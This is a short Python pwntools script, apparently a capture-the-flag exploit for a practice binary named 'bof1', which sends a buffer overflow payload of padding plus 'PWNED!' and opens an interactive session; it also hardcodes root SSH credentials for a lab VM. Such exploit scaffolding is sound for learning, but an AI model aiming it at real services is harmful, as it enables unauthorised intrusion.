from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22 # My VM Server
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn01"

exe = ELF("./bof1",checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/bof1"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sla = p.sendlineafter
    sa = p.sendafter
    r = p.recv
    ru = p.recvuntil
    rn = p.recvn
    rl = p.recvline
    # === Exploit === #
    payload = b"A" * 0x10 + b"PWNED!"
    log.success(payload)
    sa(b"word> ", payload)
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()